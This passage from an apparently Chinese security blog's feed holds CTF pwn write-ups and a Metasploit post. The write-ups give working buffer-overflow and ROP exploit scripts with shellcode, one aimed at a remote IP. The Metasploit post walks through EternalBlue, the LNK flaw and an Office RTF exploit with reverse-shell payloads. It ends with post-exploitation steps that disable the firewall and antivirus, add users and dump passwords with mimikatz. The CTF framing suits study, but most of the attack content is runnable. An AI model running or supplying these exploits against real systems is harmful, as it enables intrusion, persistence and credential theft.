src="http://ww4.sinaimg.cn/large/006rgqhqgy1fjnyk5kgi5j30op06uq45.jpg" alt=""><br>   改变返回地址<br>   ret = 0xffffcf80<br>   运行<br>   <img src="http://ww3.sinaimg.cn/large/006rgqhqgy1fjnyn32vutj30dc03nt8v.jpg" alt=""><br>   成功！<br>   然而，并没有做过pwn题的我来说，我就直接运行，悲剧发生了</p><p>   原来要在本地跑运行，然后 核心转存，用生成的coredump来调试<br>   核心转存配置：<br>   <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">ulimit -c unlimited</div><div class="line">echo /tmp/core.%e.%p &gt; /proc/sys/kernel/core_pattern</div></pre></td></tr></table></figure></p><p>   <img src="http://ww3.sinaimg.cn/large/006rgqhqgy1fjnyz0rjcdj30q605j0tb.jpg" alt=""></p><p>   这几个指令。执行完后我们就关掉整个linux系统的ASLR保护。<br>   <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">cat /proc/sys/kernel/randomize_va_space</div><div class="line">echo 0 &gt; /proc/sys/kernel/randomize_va_space</div></pre></td></tr></table></figure></p><p>   本地运行：<br>   <code>socat tcp-l:4000,fork exec:./pwn0</code></p><p>   本地生成core.pwn0.2684文件,调试core.pwn0.2684文件<br>   <code>gdb pwn0 core.pwn0.2684</code><br>   如图：<br>   <img src="http://ww3.sinaimg.cn/large/006rgqhqgy1fjnzf4p7wfj30kt07gmy3.jpg" alt=""></p><p>   本地测试运行成功，连上目标机器，就不能成功，可能是libc.so.6不同<br>   exp:<br>   <figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line">shellcode = <span class="string">"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"</span>;</div><div class="line">p = remote(<span class="string">'115.159.26.117'</span>,4000)</div><div class="line">ret = 0xffffced0</div><div class="line">payload = <span class="string">'b'</span>*24+p32(ret)+shellcode+<span class="string">'a'</span>*(261-28-len(shellcode))</div><div class="line">p.sendline(payload)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure></p><p>这里我先用一个循环脚本写找到那个shellcode的地址，在代入<br>exp：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line">shellcode = <span class="string">"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"</span>;</div><div class="line"><span class="string">''</span><span class="string">'</span></div><div class="line"><span class="string">c=[]</span></div><div class="line"><span class="string">for i in range(1000):</span></div><div class="line"><span class="string">p = remote('</span>115.159.26.117<span class="string">',4000)</span></div><div class="line"><span class="string">ret = 0xffffcea0+i</span></div><div class="line"><span class="string">payload = '</span>b<span class="string">'*24+p32(ret)+shellcode+'</span>a<span class="string">'*(261-28-len(shellcode))</span></div><div class="line"><span class="string">p.sendline(payload)</span></div><div class="line"><span class="string">try:</span></div><div class="line"><span class="string">print p.recv(timeout=0.1)</span></div><div class="line"><span class="string">print p.recv(timeout=0.1)</span></div><div class="line"><span class="string">print p.recv(timeout=0.1)</span></div><div class="line"><span class="string">print p.recv(timeout=0.1)</span></div><div class="line"><span class="string">print p.recv(timeout=0.1)</span></div><div class="line"><span class="string">print p.recv(timeout=0.1)</span></div><div class="line"><span class="string">print p.recv(timeout=0.1)</span></div><div class="line"><span class="string">print p.recv(timeout=0.1)</span></div><div class="line"><span class="string">print p.recv(timeout=0.1)</span></div><div class="line"><span class="string">print p.recv(timeout=0.1)</span></div><div class="line"><span class="string">print p.recv(timeout=0.1)</span></div><div class="line"><span class="string">print p.recv(timeout=0.1)</span></div><div class="line"><span class="string">print p.recv(timeout=0.1)</span></div><div class="line"><span class="string">print p.recv(timeout=0.1)</span></div><div class="line"><span class="string">print p.recv(timeout=0.1)</span></div><div class="line"><span class="string">print i</span></div><div class="line"><span class="string">c.append(i)</span></div><div class="line"><span class="string">except:</span></div><div class="line"><span class="string">p.close()</span></div><div class="line"><span class="string">pass</span></div><div class="line"><span class="string">p.interactive()</span></div><div class="line"><span class="string">print c</span></div><div class="line"><span class="string">'</span><span class="string">''</span></div><div class="line">p = remote(<span class="string">'115.159.26.117'</span>,4000)</div><div class="line">ret = 0xffffcea0+848</div><div class="line">payload = <span class="string">'b'</span>*24+p32(ret)+shellcode+<span class="string">'a'</span>*(261-28-len(shellcode))</div><div class="line">p.sendline(payload)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;某平台上的一道题&lt;br&gt;
    
    </summary>
    
      <category term="pwn" scheme="http://yoursite.com/categories/pwn/"/>
    
    
  </entry>
  
  <entry>
    <title>MSF渗透测试</title>
    <link href="http://yoursite.com/2018/05/09/msf_17_010/"/>
    <id>http://yoursite.com/2018/05/09/msf_17_010/</id>
    <published>2018-05-09T03:52:41.268Z</published>
    <updated>2018-05-02T02:39:24.996Z</updated>
    
    <content type="html"><![CDATA[<p>ms17-010可谓一世英雄<br><a id="more"></a></p><h2 id="ms17-010（smb-445）"><a href="#ms17-010（smb-445）" class="headerlink" title="ms17-010（smb 445）"></a>ms17-010（smb 445）</h2><p>1、漏洞检测<br>运行数据库<br><code>service postgresql start</code><br>启动msfconsole<br><code>msfconsole -q</code><br>使用smb_ms17_010模块探测MS17-010漏洞<br><code>use auxiliary/scanner/smb/smb_ms17_010</code><br><code>set rhosts 192.168.1.134</code></p><p>2、把扫描结果进行ms17-010漏洞检测<br>使用攻击模块<br><code>use exploit/windows/smb/ms17_010_eternalblue</code><br>option（or info）查看参数<br><code>set rhost 192.168.1.134</code><br>这需要路由器开放端口，才能返弹<br><code>set payload windows/x64/meterpreter/reverse_tcp</code><br>这直接绑定<br><code>set payload windows/x64/meterpreter/bind_tcp</code><br>run运行</p><h2 id="CVE-2017-8464（震网漏洞）"><a href="#CVE-2017-8464（震网漏洞）" class="headerlink" title="CVE-2017-8464（震网漏洞）"></a>CVE-2017-8464（震网漏洞）</h2><p>插上U盘即中招<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">use exploit/windows/fileformat/cve_2017_8464_lnk_rce</div><div class="line">set payload windows/x64/meterpreter/reverse_tcp</div><div class="line">set target 1</div><div class="line">set lhost 192.168.1.20</div><div class="line">exploit</div></pre></td></tr></table></figure></p><p><code>cp -r /root/.msf4/local/ /root/1</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">use exploit/multi/handler</div><div class="line">set payload windows/x64/meterpreter/reverse_tcp</div><div class="line">set lhost 192.168.1.20</div><div class="line">exploit -j</div></pre></td></tr></table></figure><p>这里需要注意的是生成的必须放在U盘的根目录（因为需要驱动，坑好久才成功）</p><h2 id="CVE-2017-8570（office）"><a href="#CVE-2017-8570（office）" class="headerlink" title="CVE-2017-8570（office）"></a>CVE-2017-8570（office）</h2><p>只要接受者打开文本即中招<br>链接：<a href="http://pan.baidu.com/s/1dF4J4PF" target="_blank" rel="external">http://pan.baidu.com/s/1dF4J4PF</a> 密码：vn0g<br><code>python cve-2017-8759_toolkit.py -M gen -w Invoice.rtf -u http://192.168.1.20/test.txt</code></p><p><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.20 LPORT=4444 -f exe &gt; shell.exe</code></p><p><code>python cve-2017-8759_toolkit.py -M exp -e http://192.168.1.20/shell.exe -l shell.exe</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">use exploit/multi/handler</div><div class="line">set payload windows/x64/meterpreter/reverse_tcp</div><div class="line">set lhost 192.168.1.20</div><div class="line">exploit -j</div></pre></td></tr></table></figure><h2 id="meterpreter的基本命令"><a href="#meterpreter的基本命令" class="headerlink" title="meterpreter的基本命令"></a>meterpreter的基本命令</h2><p>1.getwd命令：可以获取当前目标机器的工作目录，也可以获得当前系统的工作目录,getuid,getpid<br>2.upload命令：可以上传文件或文件夹到目标机器<br><code>upload /root/muma.py d:\\</code><br>3.download命令：从目标机器上下载文件夹或者文件到攻击机<br><code>download muma.py /root</code><br>4.search命令：支持对远程目标机器上的文件进行搜索<br>5.portfwd命令：这个是meterpreter内嵌的端口转发器,目标主机开放的远程桌面3389端口<br><code>portfwd add -l 3389 -r 10.21.13.225 -p 3389</code><br>这条命令也可以开启3389远程桌面<br><code>run post/windows/manage/enable_rdp</code><br>或<br><code>run getgui -e</code><br>6.ps命令可以用来获取目标主机上正在运行的进程信息<br>7.migrate命令，将当前meterpreter会话从一个进程移植到另外一个进程的内存空间中,如果该程序中断，meterpreter也会中断<br><code>migrate 10652(pid)</code><br>8.execute命令：可以在目标机中执行文件<br><code>execute -H -f cmd.exe</code><br>9.关闭目标机器的防火墙<br><code>netsh adcfirewall set allprofiles state off</code><br>10.添加用户<br><code>run getgui -u xxxxx -p xxxxx</code><br>11.关闭杀毒软件<br><code>run killav</code><br>12.屏幕截图<br><code>screenshot</code><br>13.shell进入windows命令行，exit()回到meterpreter<br>14.打开cmd命令行，看看已打开的端口<br><code>netstat -ano</code><br>15.测试是不是虚拟机<br><code>run post/windows/gather/checkvm</code><br>16.获取明文账号和密码<br><code>load mimikatz</code><br><code>kerberos</code><br><code>msv</code></p><p>远程连接<br><code>mstsc</code></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;ms17-010可谓一世英雄&lt;br&gt;
    
    </summary>
    
      <category term="misc" scheme="http://yoursite.com/categories/misc/"/>
    
    
  </entry>
  
  <entry>
    <title>PWN_x86中的ROP利用</title>
    <link href="http://yoursite.com/2018/05/09/pwn4_rop/"/>
    <id>http://yoursite.com/2018/05/09/pwn4_rop/</id>
    <published>2018-05-09T03:52:41.268Z</published>
    <updated>2018-05-06T01:37:56.620Z</updated>
    
    <content type="html"><![CDATA[<p>啥是rop?<br><a id="more"></a></p><h1 id="rop-x86"><a href="#rop-x86" class="headerlink" title="rop_x86"></a>rop_x86</h1><h2 id="CTF中的ROP"><a href="#CTF中的ROP" class="headerlink" title="CTF中的ROP"></a>CTF中的ROP</h2><p>顾名思义ROP，就是面向返回语句的编程方法，它借用libc代码段里面的多个retq前的一段指令拼凑成一段有效的逻辑，从而达到攻击的目标。</p><h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#include &lt;stdio.h&gt;</span></div><div class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></div><div class="line">void f()</div><div class="line">&#123;</div><div class="line">     system(<span class="string">"no_shell_QQ"</span>);</div><div class="line">&#125;</div><div class="line">void secure(void)</div><div class="line">&#123;</div><div class="line">    char buf1[100];</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"What do you think ?\n"</span>);</div><div class="line">    gets(buf1);</div><div class="line">&#125;</div><div class="line">int main(void)</div><div class="line">&#123;</div><div class="line">    secure();</div><div class="line">    <span class="built_in">return</span> 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>运行命令生成<br><code>gcc -m32 -no-pie -fno-stack-protector -z execstack -o pwn2 pwn2.c</code></p><h2 id="漏洞原理，利用rop结合ret2blic技术"><a href="#漏洞原理，利用rop结合ret2blic技术" class="headerlink" title="漏洞原理，利用rop结合ret2blic技术"></a>漏洞原理，利用rop结合ret2blic技术</h2><p>1、找到system_addr,gets_addr,sh_addr，这些都可以用<br>system_addr=elf.symbols(‘system’)<br>system_plt = elf.symbols[‘system’]<br>get_plt =  elf.symbols[‘gets’]<br>sh_addr= elf.bss()<br>2、找到gadgets，也就是利用rop<br>先得到gadgets,这里大神都用ROPGadget，不过我还不会用，我是用objdump,执行以下命令<br><code>objdump -d ./pwn2 | egrep &#39;ret|pop&#39;</code><br>结果如下<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">8048309:5b                   pop    %ebx</div><div class="line">804830a:c3                   ret    </div><div class="line">8048372:5e                   pop    %esi</div><div class="line">80483a3:c3                   ret    </div><div class="line">80483d9:f3 c3                repz ret </div><div class="line">8048413:f3 c3                repz ret </div><div class="line">804843c:f3 c3                repz ret </div><div class="line">8048495:c3                   ret    </div><div class="line">80484ce:c3                   ret    </div><div class="line">80484f7:59                   pop    %ecx</div><div class="line">80484f8:5d                   pop    %ebp</div><div class="line">80484fc:c3                   ret    </div><div class="line">8048500:c3                   ret    </div><div class="line">8048568:5b                   pop    %ebx</div><div class="line">8048569:5e                   pop    %esi</div><div class="line">804856a:5f                   pop    %edi</div><div class="line">804856b:5d                   pop    %ebp</div><div class="line">804856c:c3                   ret    </div><div class="line">8048570:f3 c3                repz ret </div><div class="line">8048586:5b                   pop    %ebx</div><div class="line">8048587:c3                      ret</div></pre></td></tr></table></figure></p><p>现在我用最后一个gadgets，pop_ebx=0x8048586</p><p>构造payload:<br>payload=’a’*112+p32(get_plt)+p32(pop_ebx)+p32(sh_addr)+p32(system_plt)+p32(1)+p32(sh_addr)</p><p>p32(get_plt):函数gets的开始地址 ，后面接返回地址[p32(pop_ebx)]，再后面是要写入字符的地址[p32(sh_addr)]<br>p32(pop_ebx):这个gadgets，将栈中他后面一个8字节的数据弹出[p32(sh_addr)],然后运行返回地址[p32(system_plt)]<br>p32(sh_addr):这是bss的地址（可读可写可执行），为了将’\bin\sh’写入这里,也是函数gets[p32(get_plt)]的参数<br>p32(system_plt):这是p32(pop_ebx)函数的返回地址，这里改为我们要执行的system的地址<br>p32(1):system的返回地址，因为用不到，这里我随便填的。<br>p32(sh_addr):system的第一个参数，要执行字符串的地址，我们要拿到shell,就填’/bin/sh’的地址</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line">p = process(<span class="string">'./pwn2'</span>)</div><div class="line">elf = ELF(<span class="string">'pwn2'</span>)</div><div class="line">system_plt = elf.symbols[<span class="string">'system'</span>]</div><div class="line">get_plt =  elf.symbols[<span class="string">'gets'</span>]</div><div class="line">sh_addr= elf.bss()</div><div class="line">pop_ebx= 0x8048586</div><div class="line"><span class="comment">#gdb.attach(p)</span></div><div class="line">payload=<span class="string">'a'</span>*112+p32(get_plt)+p32(pop_ebx)+p32(sh_addr)+p32(system_plt)+p32(1)+p32(sh_addr)</div><div class="line">p.sendline(payload)</div><div class="line">p.sendline(<span class="string">'/bin/sh'</span>)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure><h1 id="rop-x64"><a href="#rop-x64" class="headerlink" title="rop_x64"></a>rop_x64</h1><h2 id="题目-全球某工商的ctf网站上的ctf题（还有源码福利）"><a href="#题目-全球某工商的ctf网站上的ctf题（还有源码福利）" class="headerlink" title="题目-全球某工商的ctf网站上的ctf题（还有源码福利）"></a>题目-全球某工商的ctf网站上的ctf题（还有源码福利）</h2><p>题目<br>链接：<a href="http://pan.baidu.com/s/1dF1Z3e5" target="_blank" rel="external">http://pan.baidu.com/s/1dF1Z3e5</a> 密码：jx30<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line">#include &lt;unistd.h&gt;</div><div class="line">void vulnerable_function() &#123;</div><div class="line">    char buf[128];</div><div class="line">    read(STDIN_FILENO, buf, 512);</div><div class="line">&#125;</div><div class="line">int main(int argc, char** argv) &#123;</div><div class="line">    write(STDOUT_FILENO, &quot;Hello, World\n&quot;, 13);</div><div class="line">    vulnerable_function();</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>查看文件类型<br><code>file pwn1</code><br>发现是64位的，吓我一跳，了解一下x64的特点</p><h2 id="x64中前六个参数依次保存在RDI-RSI-RDX-RCX-R8和-R9寄存器里，如果还有更多的参数的话才会保存在栈上。"><a href="#x64中前六个参数依次保存在RDI-RSI-RDX-RCX-R8和-R9寄存器里，如果还有更多的参数的话才会保存在栈上。" class="headerlink" title="x64中前六个参数依次保存在RDI, RSI, RDX, RCX, R8和 R9寄存器里，如果还有更多的参数的话才会保存在栈上。"></a>x64中前六个参数依次保存在RDI, RSI, RDX, RCX, R8和 R9寄存器里，如果还有更多的参数的话才会保存在栈上。</h2><p>如write(rdi,rsi,rdx)<br>先明确目标<br>1、用于任意地址读<br>2、用于任意地址写<br>3、获取shell</p><p>可以看到这个程序仅仅只有一个buffer overflow，也没有任何的辅助函数可以使用，所以我们要先想办法泄露内存信息，找到system()的值，然后再传递“/bin/sh”到.bss段, 最后调用system(“/bin/sh”)。因为原程序使用了write()和read()函数，我们可以通过write()去输出write.got的地址，从而计算出libc.so在内存中的地址。但问题在于write()的参数应该如何传递，因为x64下前6个参数不是保存在栈中，而是通过寄存器传值。我们使用ROPgadget并没有找到类似于pop rdi, ret,pop rsi, ret这样的gadgets。那应该怎么办呢？其实在x64下有一些万能的gadgets可以利用。比如说我们用objdump -d ./pwn2观察一下__libc_csu_init()这个函数。一般来说，只要程序调用了libc.so，程序都会有这个函数用来对libc进行初始化操作。</p><p><code>objdump -d pwn1</code><br>如下:<br><img src="http://ww4.sinaimg.cn/large/006rgqhqgy1fk37g59505j30vy0jxjuy.jpg" alt=""><br>我们可以看到利用0x4005fa处的代码我们可以控制rbx,rbp,r12,r13,r14和r15的值，随后利用0x4005e0处的代码我们将r15的值赋值给rdx, r14的值赋值给rsi,r13的值赋值给edi，随后就会调用call qword ptr [r12+rbx8]。这时候我们只要再将rbx的值赋值为0，再通过精心构造栈上的数据，我们就可以控制pc去调用我们想要调用的函数了（比如说write函数）。执行完call qword ptr [r12+rbx8]之后，程序会对rbx+=1，然后对比rbp和rbx的值，如果相等就会继续向下执行并ret到我们想要继续执行的地址。所以为了让rbp和rbx的值相等，我们可以将rbp的值设置为1，因为之前已经将rbx的值设置为0了。大概思路就是这样，我们下来构造ROP链。</p><p>那就先来第一步吧，任意地址读，这里我们需要gadget<br>注意我们的gadget是call qword ptr [r12+rbx*8]，所以我们应该使用write.got的地址而不是write.plt的地址。payload1任意地址读<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">payload1 = &apos;a&apos;*136</div><div class="line">payload1 +=p64(0x4005fa)+p64(0)+p64(1)+p64(write_got)+p64(8)+p64(raddr)+p64(1)</div><div class="line">payload1 +=p64(0x4005e0)+&apos;12345678&apos;*7</div><div class="line">payload1 +=p64(main_addr)</div></pre></td></tr></table></figure></p><p>第二步吧，任意地址写<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">payload2 = &apos;a&apos;*136</div><div class="line">print hex(wAddress)</div><div class="line">payload2 += p64(0x4005fa)+p64(0)+p64(1)+p64(read_got)+p64(8)+p64(wAddress)+p64(0)</div><div class="line">payload2 += p64(0x4005e0)+&apos;12345678&apos;*7</div><div class="line">payload2 += p64(main_addr)</div></pre></td></tr></table></figure></p><p>第三步吧，获取shell</p><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line"></div><div class="line">elf=ELF(&apos;pwn1&apos;)</div><div class="line">so = ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</div><div class="line">#so=ELF(&apos;libc.so.6&apos;)</div><div class="line"></div><div class="line">write_got = elf.got[&apos;write&apos;]</div><div class="line">read_got = elf.got[&apos;read&apos;]</div><div class="line">main_addr = elf.symbols[&apos;main&apos;]</div><div class="line">bssAddr = elf.bss()</div><div class="line"></div><div class="line">def leak(raddr):</div><div class="line">  payload = &apos;a&apos;*136</div><div class="line">  payload +=p64(0x4005fa)+p64(0)+p64(1)+p64(write_got)+p64(8)+p64(raddr)+p64(1)</div><div class="line">  payload +=p64(0x4005e0)+&apos;12345678&apos;*7</div><div class="line">  payload +=p64(main_addr)</div><div class="line">  p.sendline(payload)</div><div class="line">  p.recvuntil(&apos;Hello, World\n&apos;)</div><div class="line">  data = p.recv(8)</div><div class="line">        return data</div><div class="line"></div><div class="line">def arbWrite(wAddress,data):</div><div class="line">    payload2 = &apos;a&apos;*136</div><div class="line">    print hex(wAddress)</div><div class="line">    payload2 += p64(0x4005fa)+p64(0)+p64(1)+p64(read_got)+p64(8)+p64(wAddress)+p64(0)</div><div class="line">    payload2 += p64(0x4005e0)+&apos;12345678&apos;*7</div><div class="line">    payload2 += p64(main_addr)</div><div class="line">    p.send(payload2)</div><div class="line">    sleep(2)</div><div class="line">    p.send(data)</div><div class="line">  </div><div class="line"></div><div class="line">p = process(&apos;pwn1&apos;)</div><div class="line">#p = remote(&apos;127.0.0.1&apos;,4001)</div><div class="line">writeAddr = u64(leak(write_got))</div><div class="line">print hex(writeAddr)</div><div class="line">#gdb.attach(p)</div><div class="line">systemAddr = writeAddr -(so.symbols[&apos;write&apos;]-so.symbols[&apos;system&apos;])</div><div class="line">sh = writeAddr - (so.symbols[&apos;write&apos;]-next(so.search(&apos;/bin/sh&apos;)))</div><div class="line">print hex(sh)</div><div class="line">p.recvuntil(&apos;Hello, World\n&apos;)</div><div class="line">arbWrite(bssAddr,p64(systemAddr))</div><div class="line">bss1 = bssAddr+8</div><div class="line"></div><div class="line">p.recvuntil(&apos;Hello, World\n&apos;)</div><div class="line">arbWrite(bss1,&apos;/bin/sh\0&apos;)</div><div class="line"></div><div class="line">p.recvuntil(&apos;Hello, World\n&apos;)</div><div class="line">payload3 = &apos;a&apos;*136</div><div class="line">payload3 += p64(0x4005fa)+p64(0)+p64(1)+p64(bssAddr)+p64(0)+p64(0)+p64(bss1)</div><div class="line">payload3 += p64(0x4005e0)+&apos;12345678&apos;*7</div><div class="line">payload3 += p64(main_addr)</div><div class="line">p.send(payload3)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure><p>这里记录一下我走过的坑，<br>1、首先是第一张4005e6  mov    %r15d,%edi，如果bin/sh所在的地址大于4字节，rdi!=edi(这是第一个参数)那么就要过这里，先把bin/sh存放在一个毕竟小的地址，bss段<br>，再将bss地址 传入edi，便可以绕过<br>2、在本地运行时libc.so.6使用自己的，而连接上目标机器使用他给的libc.so.6</p><h1 id="DynELF泄露函数地址"><a href="#DynELF泄露函数地址" class="headerlink" title="DynELF泄露函数地址"></a>DynELF泄露函数地址</h1><h2 id="源码-1"><a href="#源码-1" class="headerlink" title="源码"></a>源码</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#include &lt;stdio.h&gt;</span></div><div class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></div><div class="line"><span class="comment">#include &lt;stdio.h&gt;</span></div><div class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></div><div class="line"><span class="comment">#include &lt;unistd.h&gt;</span></div><div class="line">void <span class="function"><span class="title">vulnerable_function</span></span>() &#123;</div><div class="line">char buf[128];</div><div class="line"><span class="built_in">read</span>(STDIN_FILENO, buf, 256);</div><div class="line">&#125;</div><div class="line">int main(int argc, char** argv) &#123;</div><div class="line">vulnerable_function();</div><div class="line">write(STDOUT_FILENO, <span class="string">"Hello, World\\n"</span>, 13);</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>运行命令生成<br><code>gcc -m32 -no-pie -fno-stack-protector -z execstack -o pwn3 pwn3.c</code></p><h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><p>没有system函数和libc.so<br>1、找到system函数<br>2、将\bin\sh写入bss段<br>3、利用gadgets构造system(‘\bin\sh’),得到shell</p><h2 id="漏洞原理，利用pwntools中的DynELF模块来寻找system-addr"><a href="#漏洞原理，利用pwntools中的DynELF模块来寻找system-addr" class="headerlink" title="漏洞原理，利用pwntools中的DynELF模块来寻找system_addr"></a>漏洞原理，利用pwntools中的DynELF模块来寻找system_addr</h2><p>这里我们采用pwntools提供的DynELF模块来进行内存搜索。首先我们需要实现一个leak(address)函数，通过这个函数可以获取到某个地址上最少1 byte的数据。<br>随后将这个函数作为参数再调用d = DynELF(leak, elf=ELF(‘./pwn3’))就可以对DynELF模块进行初始化了。然后可以通过调用system_addr = d.lookup(‘system’, ‘libc’)来得到libc.so中system()在内存中的地址。这里的leak函数是这样的:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">def leak(address):</div><div class="line">    payload1=<span class="string">'a'</span>*140+p32(write_plt)+p32(main)+p32(1)+p32(address)+p32(4)</div><div class="line">    p.send(payload1)</div><div class="line">    data = p.recv(4)</div><div class="line">    <span class="built_in">print</span> <span class="string">"%#x =&gt; %s"</span> % (address, (data or <span class="string">''</span>).encode(<span class="string">'hex'</span>))</div><div class="line">    <span class="built_in">return</span> data</div></pre></td></tr></table></figure></p><p>write(fb,addr,len)对应<br>write(p32(1),p32(address),p32(4))<br>p32(write_plt):这是原返回地址，改为write_plt的地址，p32(main)是write_plt的返回地址 ，p32(1)是write_plt的参数1代表读，0代表写，p32(address)是write_plt要读的地址，p32(4)是write_plt要读的字节数</p><p>这样就会循环读取函数地址 ,读取地址<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">p = process(<span class="string">'./pwn3'</span>)</div><div class="line">d = DynELF(leak, elf=ELF(<span class="string">'./pwn3'</span>))</div><div class="line"></div><div class="line">system_addr = d.lookup(<span class="string">'system'</span>, <span class="string">'libc'</span>)</div><div class="line"><span class="built_in">print</span> <span class="string">"system_addr="</span> + 